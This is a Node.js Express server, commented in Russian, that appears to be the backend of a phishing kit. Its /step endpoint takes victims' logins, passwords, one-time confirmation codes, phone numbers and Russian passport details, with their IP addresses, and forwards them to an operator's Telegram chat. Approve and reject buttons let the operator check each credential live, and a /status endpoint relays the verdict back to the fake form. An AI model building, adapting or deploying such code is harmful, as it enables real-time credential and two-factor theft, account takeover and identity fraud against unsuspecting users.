require('dotenv').config();

// Add unhandled promise rejection handler at the very beginning
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Optional: process.exit(1); // Exit with failure code if necessary
});

const express = require("express");
const fetch = require("node-fetch");
const bodyParser = require("body-parser");
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3001;

// === КОНФИГУРАЦИЯ ===
if (!process.env.TELEGRAM_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
  console.error('Ошибка: Отсутствуют необходимые переменные окружения!');
  process.exit(1);
}

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Простой кэш для хранения последних IP-адресов
const ipCache = new Map();
const CACHE_TIMEOUT = 24 * 60 * 60 * 1000; // 24 часа

// Очистка старых записей из кэша
setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of ipCache.entries()) {
    if (now - data.timestamp > CACHE_TIMEOUT) {
      ipCache.delete(ip);
    }
  }
}, 60 * 60 * 1000); // Проверка каждый час

// Кэш для хранения статусов
const statusCache = new Map();
const STATUS_TIMEOUT = 24 * 60 * 60 * 1000; // 24 часа

// Очистка старых статусов
setInterval(() => {
  const now = Date.now();
  for (const [key, data] of statusCache.entries()) {
    if (now - data.timestamp > STATUS_TIMEOUT) {
      statusCache.delete(key);
    }
  }
}, 60 * 60 * 1000); // Проверка каждый час

function getUserId(ip) {
  const cached = ipCache.get(ip);
  if (cached) {
    cached.timestamp = Date.now();
    return cached.userId;
  }
  
  const userId = (ipCache.size + 1).toString();
  ipCache.set(ip, { userId, timestamp: Date.now() });
  return userId;
}

async function sendToTelegram(message, replyMarkup = null) {
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML"
  };
  
  if (replyMarkup) {
    payload.reply_markup = JSON.stringify(replyMarkup);
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      console.error(`Ошибка отправки в Telegram: ${response.status}`);
      return false;
    }

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Ошибка при отправке в Telegram:', error.message);
    return false;
  }
}

// === ОБРАБОТЧИКИ ЗАПРОСОВ ===
app.post("/step", async (req, res) => {
  const { step, value, origin, userId } = req.body;
  if (!userId) return res.status(400).json({ error: 'No userId' });

  // Сохраняем статус в кэш
  const statusKey = `${userId}:${step}`;
  statusCache.set(statusKey, { status: "waiting", timestamp: Date.now() });

  const ip = formatIP(req.ip);
  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n�� IP: ${ip}\n`;
  
  const readable = {
    login: "Логин",
    password: "Пароль",
    code: "Код подтверждения",
    code1: "Код 1",
    code2: "Код 2",
    code3: "Код 3",
    phone: "Телефон",
    document: "Документ",
    passport: "Паспорт РФ",
    finalCode: "Финальный код",
    login_password: "Логин/Пароль",
    document_type: "Тип документа"
  };

  if (step === 'resend_code_click') {
    msg = `🔄 Пользователь #${userId} нажал «Отправить повторно»\n${msg}`;
    await sendToTelegram(msg);
    return res.json({ ok: true });
  }

  msg += step === 'login_password' ? `📄 ${value}` : `📄 ${readable[step] || step}: ${value}`;

  const withApproval = ["login", "password", "login_password", "code", "code1", "code2", "code3", "document", "finalCode", "passport"];
  
  if (withApproval.includes(step)) {
    const reply_markup = {
      inline_keyboard: [[
        { text: "✅ Верно", callback_data: `${userId}:${step}:ok` },
        { text: "❌ Неверно", callback_data: `${userId}:${step}:fail` }
      ]]
    };
    await sendToTelegram(msg, reply_markup);
  } else {
    await sendToTelegram(msg);
  }

  res.json({ ok: true });
});

app.post('/auth-visit', (req, res) => {
  const ip = formatIP(req.ip);
  const userId = getUserId(ip);
  const msg = `🆕 Пользователь #${userId} (IP: ${ip}) зашёл на форму авторизации\nВремя: ${getMoscowTime()}`;
  sendToTelegram(msg);
  res.json({ userId });
});

// Добавляем обработчик статуса
app.get("/status", (req, res) => {
  const { step, userId } = req.query;
  if (!userId) return res.json({ status: "none" });
  
  const statusKey = `${userId}:${step}`;
  const cachedStatus = statusCache.get(statusKey);
  const status = cachedStatus ? cachedStatus.status : "none";
  
  res.json({ status });
});

// Вспомогательные функции
function formatIP(ip) {
  return ip.replace('::ffff:', '');
}

function getMoscowTime() {
  return new Date().toLocaleString('ru-RU', {
    timeZone: 'Europe/Moscow',
    year: 'numeric',
    month: 'numeric',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

// === TELEGRAM POLLING ===
let pollingInterval = null;
let isPolling = false;
let lastUpdate = 0;

async function pollTelegram() {
  if (isPolling) return;
  
  isPolling = true;
  
  pollingInterval = setInterval(async () => {
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdate + 1}&timeout=1`);
      if (!res.ok) return;
      
      const data = await res.json();
      if (!data.ok || !data.result?.length) return;
      
      for (const update of data.result) {
        lastUpdate = update.update_id;
        if (update.callback_query) {
          const [userId, step, action] = (update.callback_query.data || '').split(':');
          if (userId && step && action) {
            const statusKey = `${userId}:${step}`;
            statusCache.set(statusKey, { 
              status: action === 'ok' ? 'ok' : 'fail',
              timestamp: Date.now()
            });
            console.log(`Обновлен статус для пользователя ${userId}, шаг ${step}: ${action}`);
          }
        }
      }
    } catch (error) {
      console.error('Ошибка при опросе Telegram:', error.message);
    }
  }, 500);
}

// Запуск опроса Telegram
pollTelegram().catch(console.error);

// Обработка завершения работы
process.on('SIGTERM', () => {
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(0);
});

process.on('SIGINT', () => {
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(0);
});

// Добавляем обработчик для необработанных исключений
process.on('uncaughtException', async (error) => {
  console.error('Uncaught Exception:', error);
  if (pollingInterval) clearInterval(pollingInterval);
  process.exit(1);
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});